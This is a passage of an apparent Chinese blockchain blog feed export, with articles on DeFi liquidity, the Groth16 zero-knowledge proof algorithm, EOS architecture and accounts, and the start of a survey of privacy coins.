而言，这就意味着核心团队只需专注于为 DAI 创造需求和流动性即可，而不需要为多资产交易去考虑整体的基础设施。 未来在过去几个月我们观察到，迄今为止，将流动性集中到更少数量市场和资产的协议有更顺利的采用路径。研发 P2P DeFi 协议背后的团队也注意到了这一点。Dharma 团队已经通过“升级”创建了一个名为 Lever 的 Dharma 应用，该应用已经超过了协议原来的 P2P 借贷量。值得注意的一点是，Lever 限制了产品组合，允许借款人和放贷人将流动性集中到少数的几个借贷类型。为了解决 P2P 流动性的问题，0x 协议团队已经将其重点从中继商转向做市商。 也就是说，这些 P2P 协议仍然需要更多的基础设施来实现扩展，而这对于限制了用户选择的其他协议来说影响更小。例如，交易对手方相互寻找的机制（请注意，Dharam、Veil/Augur以及 0x 都包含了某种“中继商”的概念），作为做市商需要解决的需求双重巧合，以及可以有效解决大量独立交易的扩展解决方案。 如果 DeFi 社区为长尾资产（例如非同质代币和预测市场份额）制定出流动性解决方案，那么，P2P 协议可能会通过提供资产类型的“无限通道”和定制敞口，超越其灵活性较低的类似物效用。这些交易对手协商的合约从理论上可以允许用户接触任何资产或世界状态。随着市场完整性飞轮的启动，这种可塑性可能允许这些系统逐渐服务那些更深的利基市场。 聚合或自动供应方协议则来自于相反的方向。例如，Maker 试图通过多资产抵押DAI 来扩展它的产品组合，Uniswap 可能会持续扩展其交易对，尽管这两个网络都必须注意在流动性方面进行分散权衡。 虽然目前还不清楚谁将是最终的赢家，但这两个类别的网络似乎都着眼于提供更广泛的市场选择，以便于为用户提供足够的流动性。目前，那些在少数几个重要市场中已经构建了深度流动性的项目似乎已经在采用上获得了领先。 本文作者为深入浅出社区共建者Ashton，喜欢他的文章可关注他的简书。 深入浅出区块链-系统学习区块链，学区块链的都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>DeFi</category>
      </categories>
      <tags>
        <tag>DeFi</tag>
        <tag>Uniswap</tag>
        <tag>Maker</tag>
        <tag>Compound</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零知识证明 - Groth16算法介绍]]></title>
    <url>%2F2019%2F05%2F27%2Fgroth16%2F</url>
    <content type="text"><![CDATA[看zk-SNARK的文章或者资料的时候，经常会碰到一些算法名称，比如Groth16，GGPR13等等。这些名称是由算法提出的作者名称或者名称首字母以及相应的年份组成。Groth16，是由Jens Groth在2016年提出的算法。GGPR13，是由Rosario Gennaro，Craig Gentry，Bryan Parno，Mariana Raykova在2013年提出的算法。 零知识证明（zk-SNARK )，从QSP/QAP到Groth16，期间也有很多学者专家，提出各种优化（优化计算时间，优化证明的大小，优化电路的尺寸等等）。Groth16提出的算法，具有非常少的证明数据（2/3个证明数据）以及一个表达式验证。 Groth16论文（On the Size of Pairing-based Non-interactive Arguments）可在这里下载。 本文主要从工程应用理解的角度介绍Groth16算法的证明和验证过程。文章中所用的中文字眼可能和行业中不一样，欢迎批评指出。 术语介绍Proofs - 在零知识证明的场景下，Proofs指具有完美的完备性（Completeness）以及完美的可靠性（Soundness）。也就是，具有无限计算资源也无法攻破。 Arguments - 在零知识证明的场景下，Arguments是指具有完美的完备性以及多项式计算的可靠性。也就是，在多项式计算能力下，是可靠的。 Schwartz-Zippel 定理 - 假设$f(x_1, x_2, …, x_n)$是个n元多项式，多项式总的阶为d。如果$r_1, r_2, …, r_n$是从有限集合S中随机选取，则$f(r_1, r_2, …, r_n) = 0$的概率是小于等于$\frac{d}{|s|}$。简单的说，如果多元多项式，在很大的集合中随机选取参数，恰好函数f等于0的概率几乎为0。参见Schwartz-Zippel 定理 Wiki 线性（Linear）函数 - 假设函数f满足两个条件：1. $f(x+y) = f(x)+f(y)$ 2. $f(\alpha x) = \alpha f(x)$，则称函数f为线性函数。 Affine 函数 - 假设函数g，能找到一个线性函数f，满足$g(x) = f(x) + b$，则称函数g为Affine函数。也就是，Affine函数是由一个线性函数和偏移构成。 Trapdoor函数 - 假设一个Trapdoor函数f，$x \to f(x)$ 很容易，但是$f(x) \to x$非常难。但是，如果提供一个secret，$f(x) \to x$也非常容易。 Jens Groth是谁？Groth是英国伦敦UCL大学的计算机系的教授。伦敦大学学院 (University College London），简称UCL，建校于1826年，位于英国伦敦，是一所世界著名的顶尖高等学府，为享有顶级声誉的综合研究型大学，伦敦大学联盟创始院校，英国金三角名校，与剑桥大学、牛津大学、帝国理工、伦敦政经学院并称G5超级精英大学。他的介绍页 。 Groth从2009年开始，每年发表一篇或者多篇密码学或者零知识证明的文章，所以你经常会听到Groth09，Groth10等等算法。 简言之，牛人～。 NILPGroth16的论文先引出NILP（non-interactive linear proofs）的定义： (1). $(\sigma, \tau) \gets Setup(R)$ ：设置过程，生成$\sigma \in F^m$, $\tau \in F^n$。 (2). $\pi \gets Prove(R, \sigma, \phi, \omega) $ ：证明过程，证明过程又分成两步：a. 生成线性关系$\Pi \gets ProofMatrix(R, \phi, \omega)$，其中ProofMatrix是个多项式算法。b. 生成证明：$\pi = \Pi\sigma$。 (3). $0/1 \gets Vfy(R, \sigma, \phi, \pi) $ ：验证过程，验证者使用$(R, \phi)$生成电路t，并验证$t(\sigma, \pi)$是否成立。 在NILP定义的基础上，Groth16进一步定义了split NILP，也就是说，CRS分成两部分$(\sigma1, \sigma2)$，证明者提交的证明也分成两部分$(\pi1, \pi2)$。 总的来说，核心在“Linear”上，证明者生成的证明和CRS成线性关系。 QAP的NILPQAP的定义为”Relation”：$$R=(F, aux, \ell, {u_i(X), v_i(X), w_i(X)}{i=0}^m, t(X))$$。也就是说，statements为$$(a_1, …, a_\ell) \in F^\ell$$， witness为$(a{l+1}, …, a_m) \in F^{m-\ell}$，并且$a_0 = 1$的情况下，满足如下的等式： $$\sum_{i=0}^m a_iu_i(X) \cdot \sum_{i=0}^m a_iv_i(X) = \sum_{i=0}^m {a_iw_i(X)+h(X)t(X)}$$ $t(X)$的阶为n。 (1). 设置过程：随机选取$\alpha, \beta, \gamma, \delta, x \gets F^*$，生成$\sigma, \tau$。 $$\tau = (\alpha, \beta, \gamma, \delta, x)$$ $$\sigma = (\alpha, \beta, \gamma, \delta, {x^i}{i=0}^{n-1}, {\cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma}}{i=0}^\ell, {\cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta}}{i=\ell+1}^m, {\cfrac{x^it(x)}{\delta}}{i=0}^{n-2})$$ (2). 证明过程：随机选择两个参数$r和s$，计算$\pi = \Pi\sigma = (A, B, C)$ $$A = \alpha + \sum_{i=0}^{m} a_i u_i(x) + r\delta$$ $$B = \beta + \sum_{i=0}^{m} a_i v_i(x) + s\delta$$ $$C = \cfrac{\sum_{i=\ell+1}^m a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))+h(x)t(x)}{\delta} + As + r B - r s \delta$$ (3). 验证过程： 验证过程，计算如下的等式是否成立： $$A\cdot B = \alpha \cdot \beta + \cfrac{\sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))}{\gamma} \cdot \gamma + C \cdot \delta$$ 注意，设置过程中的x是一个值，不是代表多项式。在理解证明/验证过程的时候，必须要明确，A/B/C的计算是和CRS中的参数成线性关系（NILP的定义）。在明确这一点的基础上，可以看出$\alpha和 \beta$的参数能保证A/B/C的计算采用统一的$$a_0, a_1, … , a_m$$ 参数。因为$$A\cdot B$$会包含$$\sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x))$$子项，要保证$$A\cdot B$$和C相等，必须采用统一的$$a_0, a_1, … , a_m$$参数。参数$r和s$增加随机因子，保证零知识（验证者无法从证明中获取有用信息）。参数$\gamma和\delta$保证了验证等式的最后两个乘积独立于$\alpha和 \beta$的参数。 完备性证明（Completeness)：完备性证明，也就是验证等式成立。 $$A\cdot B = (\alpha + \sum_{i=0}^{m} a_i u_i(x) + r\delta) \cdot (\beta + \sum_{i=0}^{m} a_i v_i(x) + s\delta) $$ $$= \alpha \cdot \beta + \alpha \cdot \sum_{i=0}^{m} a_i v_i(x) + \alpha s \delta$$$$ + \beta \cdot \sum_{i=0}^{m} a_i u_i(x) + \sum_{i=0}^{m} a_i u_i(x) \cdot \sum_{i=0}^{m} a_i v_i(x) + s\delta \cdot \sum_{i=0}^{m} a_i u_i(x)$$$$ + r\delta \beta + r\delta \sum_{i=0}^{m} a_i v_i(x) + rs\delta^2$$ $$ = \alpha \cdot \beta + \sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x)) + \sum_{i=\ell + 1}^m a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x)) + h(t)\cdot t(x) $$ $$+ \alpha s \delta + s\delta \cdot \sum_{i=0}^{m} a_i u_i(x) + r s \delta^2$$ $$ + r\delta \beta + r\delta \sum_{i=0}^{m} a_i v_i(x) + r s \delta^2$$ $$ - r s \delta^2 $$ $$ = \alpha \cdot \beta + \sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x)) + \sum_{i=\ell + 1}^m a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x)) + h(t)\cdot t(x) $$ $$+ A s \delta + r B \delta - r s \delta^2$$ $$ = \alpha \cdot \beta + \cfrac{\sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))}{\gamma} \cdot \gamma + C \cdot \delta $$ 可靠性证明 (Soundness):Groth16算法证明的是statistical knowledge soundness，假设证明者提供的证明和CRS成线性关系。也就是说，证明A可以用如下的表达式表达(A和CRS的各个参数成线性关系）： $$A = A_\alpha \alpha + A_\beta \beta + A_\gamma \gamma + A_\delta \delta + A(x) + \sum_{i=0}^{\ell} A_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} + \sum_{i=\ell + 1}^{m} A_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + A_h(x)\cfrac{t(x)}{\delta}$$ 同理，B/C都可以写成类似的表达： $$B = B_\alpha \alpha + B_\beta \beta + B_\gamma \gamma + B_\delta \delta + B(x) + \sum_{i=0}^{\ell} B_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} + \sum_{i=\ell + 1}^{m} B_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + B_h(x)\cfrac{t(x)}{\delta}$$ $$C = C_\alpha \alpha + C_\beta \beta + C_\gamma \gamma + C_\delta \delta + C(x) + \sum_{i=0}^{\ell} C_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} + \sum_{i=\ell + 1}^{m} C_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + C_h(x)\cfrac{t(x)}{\delta}$$ 从Schwartz-Zippel 定理，我们可以把A/B/C看作是$\alpha, \beta, \gamma, \delta, x$的多项式。观察$A\cdot B = \alpha \cdot \beta + \cfrac{\sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))}{\gamma} \cdot \gamma + C \cdot \delta$ 这个验证等式，发现一些变量的限制条件： 1） $$A_\alpha B_\alpha \alpha^2 = 0$$ (等式的右边没有$$\alpha^2因子$$) 不失一般性，可以假设$B_\alpha = 0$。 2） $$A_\alpha B_\beta + A_\beta B_\alpha = A_\alpha B_\beta = 1$$ （等式右边$$\alpha \beta = 1$$） 不失一般性，可以假设$$A_\alpha = B_\beta = 1$$。 3） $$A_\beta B_\beta = A_\beta = 0 $$(等式的右边没有$\beta^2$因子) 也就是$A_\beta = 0$。 在上述三个约束下，A/B的表达式变成： $$A = \alpha + A_\gamma \gamma + A_\delta \delta + A(x) + \sum_{i=0}^{\ell} A_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} + \sum_{i=\ell + 1}^{m} A_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + A_h(x)\cfrac{t(x)}{\delta}$$ $$B = \beta + B_\gamma \gamma + B_\delta \delta + B(x) + \sum_{i=0}^{\ell} B_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} + \sum_{i=\ell + 1}^{m} B_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + B_h(x)\cfrac{t(x)}{\delta}$$ 4）等式的右边没有$\cfrac{1}{\delta^2}$ $$(\sum_{i=\ell+1}^m A_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) + A_h(x)t(x))(\sum_{i=\ell+1}^m B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) + A_h(x)t(x)) = 0$$ 不失一般性，$\sum_{i=\ell+1}^m A_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) + A_h(x)t(x) = 0$ 5）等式的右边没有$\cfrac{1}{\gamma^2}$ $$(\sum_{i=0}^\ell A_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)))(\sum_{i=0}^\ell B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x))) = 0$$ 不失一般性，$\sum_{i=0}^\ell A_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) = 0$。 6）等式的右边没有$\cfrac{\alpha}{\gamma}$， $\cfrac{\alpha}{\delta}$ $$\alpha \cfrac{\sum_{i=0}^\ell B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x))}{\gamma} = 0$$ $$\alpha \cfrac{\sum_{i=\ell+1}^m B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) + B_h(x)t(x)}{\delta} = 0$$ 所以，$$\sum_{i=0}^\ell B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) = 0，\sum_{i=\ell+1}^m B_i(\beta u_i(x) + \alpha v_i(x) + w_i(x)) + B_h(x)t(x)$$ 。 7）等式的右边没有$\beta \gamma$和$\alpha\gamma$ $$A_\gamma \beta \gamma = 0, B_\gamma \alpha \gamma = 0$$ 所以，$$A_\gamma =0, B_\gamma = 0$$。 在上述七个约束下，A/B的表达式变成： $A = \alpha + A_\delta \delta + A(x) $ $B = \beta + B_\delta \delta + B(x)$ 再看验证的等式： $A\cdot B = \alpha \cdot \beta + \cfrac{\sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))}{\gamma} \cdot \gamma + C \cdot \delta$ $= \alpha \cdot \beta + \sum_{i=0}^\ell a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x)) + C \cdot \delta$ 观察$C \cdot \delta$，因为不存在 $\cfrac{\delta}{\gamma}$，所以，$\sum_{i=0}^{\ell} C_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma} = 0$。 也就是说，$$C = C_\alpha \alpha + C_\beta \beta + C_\gamma \gamma + C_\delta \delta + C(x) + \sum_{i=\ell + 1}^{m} C_i \cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\delta} + C_h(x)\cfrac{t(x)}{\delta}$$。 代入验证等式，所以可以推导出： $$\alpha B(x) = \sum_{i=0}^\ell a_i \alpha v_i(x) + \sum_{i=\ell+1}^m C_i \alpha v_i(x) $$， $$\beta A(x) = \sum_{i=0}^\ell a_i \beta u_i(x) + \sum_{i=\ell+1}^m C_i \beta u_i(x) $$ 如果，假设，对于$i=\ell+1, … , m，a_i = C_i$，则 $A(x) = \sum_{i=0}^m a_i u_i(x)$ $B(x) = \sum_{i=0}^m a_i v_i(x)$ 代入A/B，可以获取以下等式： $$\sum_{i=0}^ma_i u_i(x) \cdot \sum_{i=0}^ma_i v_i(x) = \sum_{i=0}^ma_i w_i(x) + C_h(x)t(x)$$ 在证明和CRS线性关系下，所有能使验证等式成立的情况下，$(a_{\ell+1}, … , a_m) = (C_{\ell+1}, … , C_m)$等式必须成立。也就说，能提供正确证明的，肯定知道witness。 QAP的NIZK Arguments从QAP的NILP可以演化为QAP的NIZK Arguments。也就是说Groth16算法并不是完美的可靠，而是多项式计算情况下可靠。QAP的定义为”Relation”：$$R=(p, G_1, G_2, G_T, e, g, h, \ell, {u_i(X), v_i(X), w_i(X)}{i=0}^m, t(X))$$。也就是说，在一个域$$Z_p$$中，statements为$$(a_1, …, a_\ell) \in Z_p^\ell$$， witness为$$(a{l+1}, …, a_m) \in Z_p^{m-\ell}$$，并且$a_0 = 1$的情况下，满足如下的等式（$t(X)$的阶为n）： $$\sum_{i=0}^m a_iu_i(X) \cdot \sum_{i=0}^m a_iv_i(X) = \sum_{i=0}^m {a_iw_i(X)+h(X)t(X)}$$ 也就是说，三个有限群$G_1, G_2, G_T$, 对应的生成元分别是$g, h, e(g,h)$。为了方便起见，也为了和论文的表达方式一致，$G_1有限群$的计算用$[y]_1 = g^y$表示，$G_2有限群$的计算用$[y]_2 = h^y$表示。 1). 设置过程：随机选取$\alpha, \beta, \gamma, \delta, x \gets Z_p^*$，生成$\sigma, \tau$。 $$\tau = (\alpha, \beta, \gamma, \delta, x)$$ $$\sigma = ([\sigma_1]_1, [\sigma_2]_2)$$ $$\sigma_1 = (\alpha, \beta, \delta, { x^i }{i=0}^{n-1}, {\cfrac{\beta u_i(x)+\alpha v_i(x) + w_i(x)}{\gamma}}{i=0}^{\ell}, {\cfrac{\beta u_i(x) + \alpha v_i(x) + w_i(x)}{\delta}}{i=\ell+1}^{m}, {\cfrac{x^it(x)}{\delta}}{i=0}^{n-2})$$ $$\sigma_2 = (\beta, \gamma, \delta, {x^i}_{i=0}^{n-1})$$ 2). 证明过程：随机选择两个参数$r和s$，计算$\pi = \Pi\sigma = ([A]_1, [C]_1, [B]_2)$ $A = \alpha + \sum_{i=0}^{m} a_i u_i(x) + r\delta$ $B = \beta + \sum_{i=0}^{m} a_i v_i(x) + s\delta$ $C = \cfrac{\sum_{i=\ell+1}^m a_i (\beta u_i(x)+\alpha v_i(x)+w_i(x))+h(x)t(x)}{\delta} + As + r B - r s \delta$ 3). 验证过程：验证如下的等式是否成立。 $$[A]1\cdot [B]_2 = [\alpha]_1 \cdot [\beta]_2 + \sum{i=0}^\ell a_i [\cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma}]_1 \cdot [\gamma]_2 + [C]_1 \cdot [\delta]_2$$ 很容易发现，验证过程的等式也可以用4个配对函数表示: ​ $$e([A]1, [B]_2) = e([\alpha]_1, [\beta]_2) \cdot e(\sum{i=0}^\ell a_i [\cfrac{\beta u_i(x)+\alpha v_i(x)+w_i(x)}{\gamma}]_1, [\gamma]_2) \cdot e([C]_1, [\delta]_2)$$ 证明过程和QAP的NILP的证明过程类似，不再详细展开。 证明元素的最小个数论文指出zk-SNARK的最少的证明元素是2个。上述的证明方式是需要提供3个证明元素（A/B/C）。论文进一步说明，如果将电路进行一定方式的改造，使用同样的理论，可以降低证明元素为2个，但是，电路的大小会变的很大。 总结：Groth16算法是Jens Groth在2016年发表的算法。该算法的优点是提供的证明元素个数少（只需要3个），验证等式简单，保证完整性和多项式计算能力下的可靠性。Groth16算法论文同时指出，zk-SNARK算法需要的最少的证明元素为2个。目前Groth16算法已经被ZCash，Filecoin等项目使用。 题外： 最近好多朋友表示对零知识证明的基础知识感兴趣，但是，zk-SNARK相关的技术涉及到比较多的数学公式的推导，比较难理解。我打算有空录个QSP/QAP/Groth16的介绍视频，方便工程开发人员快速的入门和理解。觉得有需要的小伙伴，大家可扫描以下二维码关注我的公众号-星想法留言“零知识证明”。 本文作者 Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家扫码关注。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>零知识证明</tag>
        <tag>Groth16</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EOS入门第二篇-技术原理]]></title>
    <url>%2F2019%2F05%2F27%2Feos-dev-principle%2F</url>
    <content type="text"><![CDATA[上一篇简析了下 EOS , 这篇分析下EOS的技术原理 。 总体架构 模块架构图 如上图所示，总体上EOS主要由keosd，cleos，nodeos三大运行时组件构成： keosd 可以认为是个密钥管理器，用来管理和EOS账户相关的公私钥。cleos 客户端命令行交互组件，用于解析用户命令，根据具体命令请求调用相应的接口，例如查看区块信息、操作钱包等等。nodeos 是EOS核心进程，EOS大部分的功能都是在 nodeos 中进行。我们可以使用插件来配置nodeos去执行各种功能。p2p网络、合约代码调度以及区块链数据持久化等大部分区块链核心功能都被放在了nodeos中。对于开发人员来说，nodeos也足够用来建立一个单节点区块链网络。 用户在和eos进行交互时，通常来说都是通过cleos来发送指令，根据具体情况将请求转发到keosd还是nodes，由keosd进行账户创建，交易签名等操作。 ##账户体系 账户体系是EOS中的亮点之一，实现了基于角色的权限管理和账户恢复功能，使得用户可以灵活地以一种组织化的方式管理账户，并最大化保证资产的安全性。 备注：EOS 账户是通过智能合约实现的。 基于角色的多层级账户体系 常见区块链项目的账户是一对公私钥，账户名就是公钥(的推倒形式)，而EOS中的账户名是由用户自定义的12位可读标识符组成，且一般一个账户可以被多对公私钥控制，每对可以自定义拥有不同的权限。遇过权限配置可实现该账户只被个体拥有或者被一个组织控制(即多个个体共同拥有)，该账户是传统公钥所代表的单一权限的更高层次抽象集合。对于常见的区块链项目而言，账号一般就是一对公私钥，如果私钥被盗取代币便可直接转走。而在EOS中，代币是放在账户里的，每个公钥可以配置不同的权重，可以控制每个公钥可以转移的账户的代币的金额（需要每个拥有转账权限的钥匙的权重之和达到设定的阁值）。EOS上的所有交易行为都是通过账户来完成的，通过账户执行任意操作时，EOS系统首先会验证操作者是否拥有足够的权限，通过验证该操作才能生效。EOS中，每个账户刚创建时一般由个体拥有，通过单一公私钥便能进行所有操作，后续可根据需要通过权限配置将该账户扩展成组织账户，由多对公私钥(即多个主体)共同控制，甚至可为组织外部个体或组织分配部分操作权限，从而实现极其灵活的组织管理方式。 账户权限管理 EOS中任意账户都自带两个原生权限: owner 和 active 权限。owner即代表账户所有权，该权限可进行所有操作，包括更改owner权限，可由一对或多对EOS公私钥或另一账户的某权限实现权限控制。因此，代表着owner权限的EOS公私钥是最重要的，必须冷储藏（离线存储）。active 即活跃权限，能进行除更改owner权限以外的所有操作，也是通过一对或多对EOS公私钥或另一账户的某权限实现权限控制的。 密钥丢失或被盗后的恢复 EOS允许恢复被盗窃的密钥，这在比特币和以太坊上是不可能的。在比特币和以太坊上一旦密钥丢失那么整个账户也将随之丢失。EOS系统软件为用户提供了密钥被盗时恢复其账户控制的方法。账户所有者可以使用过去30天内活跃的任何其批准的账户恢复合作伙伴的密钥，并重置账户上的所有者密钥。没有账户所有者的配合，账户恢复合作伙伴无法重置账户的控制权。 本文作者为深入浅出社区共建者Ashton，喜欢他的文章可关注他的简书。 深入浅出区块链-系统学习区块链，学区块链的都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>EOS</category>
      </categories>
      <tags>
        <tag>EOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EOS 入门第一篇 - 简析 EOS]]></title>
    <url>%2F2019%2F05%2F24%2Feos-dev-intro%2F</url>
    <content type="text"><![CDATA[今天加入了一个日更计划，打算从今天开始，系统的说一下 EOS。 为啥要关注 EOS下面是按 7 天交易量对 DApp 排序的一个结果, 数据来源这里。排名前五的 DApp 中，由四个是运行在 EOS 上的。 DApp 按 7 天交易量排名 如果按 24 小时用户数进行排序，排名前五的全都是运行在 EOS 上的 DApp。 DApp 按 24 小时用户数排名 尽管一直备受争议，EOS 毫无疑问已经逐步成为比较能让 DApp 落地的区块链基础设施。 什么是 EOSEOS 的全称是 Enterprise Operation System，字面意思为企业级区块链操作系统。比特币的诞生就是实现了点对点的加密货币系统，以太坊的出现实现了图灵完备的虚拟机(智能合约平台)。 EOS 平台可以理解为一个系统，在该系统上的智能合约就类似于操作系统下的各个程序与软件。和操作系统类似，EOS 提供了帐户、身份验证、数据库、异步通信以及跨多个 CPU 核心或集群的应用程序调度支持。按照官方规划，EOS 会具有强大的横向扩展和纵向扩展能力，每秒可以支持数百万个交易，同时普通用户无需支付使用费用。 当然，牛逼不是一天落地的，现在每秒百万交易还无法看到，不过峰值达到每秒数千的 TPS 已经是实实在在的了。EOS 本身也正在快速的演化过程中。 EOS 与 BM就像谈比特币就离不开中本聪，谈以太坊就离不开 V 神，谈 EOS 就少不了要说一下另一位传奇人物 BM。 BM 原名叫 Daniel Larimer，之所以叫 BM 只是因为他在网上经常使用网名 ByteMaster。 BM 对币圈老韭菜来说并不陌生，可以说是如雷贯耳了吧。别人整一个区块链系统就费老鼻子劲了，这货儿却一口气整了三个出来。2013 年推出比特股(Bitshare) 去中心化交易所，开始引入 DPos 共识，10 秒种出一个块。2015 年，为了更好地优化系统性能， BM 团队发布了石墨烯工具组， Bitshare2.0 采用了此技术之后，缩短了区块生产的速度，每 3 秒就可以产出一个块，同时支持每秒1万笔交易的处理速度。后来他目光放在了内容社区上，并打造了一个 通过加密货币奖励支持社区建设和社交互动的区块链数据库一Steem。 Steem 沿用了比特股的底层技术 : 石墨烯底层框架，在交易性能和用户体验方面都达到了相当高的水准。 EOS 可以说是 BM 对于区块链技术理解的总结，这次 BM 将以太坊作为自己的对手，建立一个区块链操作系统。 EOS 与 block.oneblock.one 是 EOS 背后的区块链公司，但 block.one 只负责 EOS 的技术开发，并不负责 EOS 的运营。EOS 的运作主要还是靠超级节点和社区。 EOS 有哪些突出特点 较高的吞吐量和可扩展性EOS 是为实现高交易吞吐量而设计的。 通过 DPOS 共识机制，EOS 区块链网络不需要等待所有节点完成交易才能达到确认状态。 与其他共识机制相比，这使得交易吞吐量更高。 更快的确认和更低的延迟为了提供良好的用户体验，EOS 被设计成具有较低的交易确认延迟，以便开发人员构建的应用程序能够与中心化的互联网应用竞争。 用户免费和资源通证化建立在 EOS 上的应用可以采用免费增值模式，用户不需要支付基础设施的费用便可进行交易。 EOS 的基础设施资源是靠一种代币抵押机制来分配的的。 你抵押多少 EOS 代币，就会相应的获取一定比例的资源，并且这些资源一直会锁定到你取消抵押，期间不会受 EOS 代币价格波动的影响。 更完善的账户与权限管理体系和比特币以太坊一个账户就是一个公私钥对不同，你可以通过 EOS 网络创建一个用户名来作为账户，每个账户下面有多对公私钥，每对公私钥可以根据业务需要赋予不同的权限。这给开发面向更复杂权限控制场景的应用提供了很大方便。 C++/WASM 虚拟机C/C++ 几乎是每个科班计算机同学的必修课。会 C++ 的同学有福了，EOS 的智能合约就是需要用 C++ 写的，不需要为了写智能合约再学一门新的语言。EOS 底层用来执行智能合约代码的是一个 WebAssembly (WASM)虚拟机。 WASM 也被谷歌、微软、苹果和其他公司开发的其他重要的互联网基础设施软件所使用。 使用 WASM 的设计选择使 EOS 能够重用经过优化和严格测试的编译器和工具链，这些编译器和工具链目前由更广泛的社区维护和改进。 此外，采用 WASM 标准还使编译器开发人员更容易将其他编程语言移植到 EOS 区块链上。 更好的支持应用升级部署在基于 EOS 区块链上的应用程序是可升级的。 这意味着开发人员在提供足够授权的情况下可以部署代码修复、添加特性和（或）更改应用程序逻辑。 作为一名开发人员，你可以持续迭代更新你的应用，而不必担心永久性地陷入错误或 bug 的风险。 当然，你也可以选择部署不可更改的智能合约。在智能合约升级方面，向左还是向右，一切由开发人员自行决定。 可编程的治理机制任何 EOS 区块链上的资源分配和治理机制都是可编程的。 EOS 的治理和资源分配是通过智能合约来控制的。 开发者只需要修改系统智能合约来改变 EOS 区块链的资源分配和管理规则。 这种方式使链上治理变得更加简单，因为在进行必要的更改时并不需要基础层代码的改动，从而可以比较好的避免应分叉带来的一些风险。 本文作者为深入浅出社区共建者 Ashton ，喜欢他的文章可关注他的简书。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>EOS</category>
      </categories>
      <tags>
        <tag>EOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简析主流匿名币：Dash、门罗币、Zcash、SERO]]></title>
    <url>%2F2019%2F05%2F23%2Fanonymous-coin%2F</url>
    <content type="text"><![CDATA[区块链一个重要分支是解决匿名隐私问题，本文从为什么需要匿名币开始讨论，继而介绍主流匿名币：Dash、门罗币、Zcash、SERO 的特点。 为啥需要匿名币区块链被广泛认为是下一代互联网，一个提供价值的工具，被认为是生产关系的重建。 它将给人类生产关系带来变化，给人类社会系统带来革新。 但在这一切到来之前，人们需要自己在区块链上的行为是能够受到保护的。特别是在某些特定的环境下，就像早年的互联网，匿名性让人们可以突破一些物理世界的道德约束，为人们提供了更大的自由话语空间。 如果要把现实世界映射到区块链世界，有更多的场景是需要匿名性保护的： ⼀家公司想要保护不让竞争对手知道的供应链信息； 个⼈不想被公众知道她正在⽀付向破产律师或离婚律师咨询的费⽤; ⼀个富有的⼈，不希望让潜在的犯罪分子了解他们的行踪以及试图勒索他们的财富； 不同商品的买卖双方希望避免交易被他们之间的中间商公司切断； 投资银⾏、对冲基金和其他类型的交易⾦融⼯具(证券、债券、衍⽣⼯具)的⾦融实体，如果其他⼈可以弄清楚他们的仓位或交易意图，那么这些信息的暴露会使交易执⾏者处于劣势，影响他们盈利的能⼒。 然而，在当前主流的区块链网络中，一旦数字钱包地址与其所有者的个人信息相关联，所有关于钱包所有者的账户信息和交易细节都将被暴露，并且不能在整个网络中消除，这将导致严重的隐私泄露问题。当前的主流区块链网络，体现的是最大程度的透明性，而不是隐私性。 当前区块链隐私问题这些区块链系统的信息暴露主要体现在以下几个方面: 交易地址不能是匿名的。比如比特币，交易地址的生成是匿名的，然而一旦地址被使用，与其有关的所有交易历史便破坏了地址的保密性。这也是为啥比特币官方文档推荐每个比特币地址只使用一次。 地址余额不能匿名。导致有大量余额的巨鲸账户被一直盯的紧紧的。地址余额的问题在以太坊和 EOS 是更为突出的。 用户的交易行为暴露了他们的个人 IP 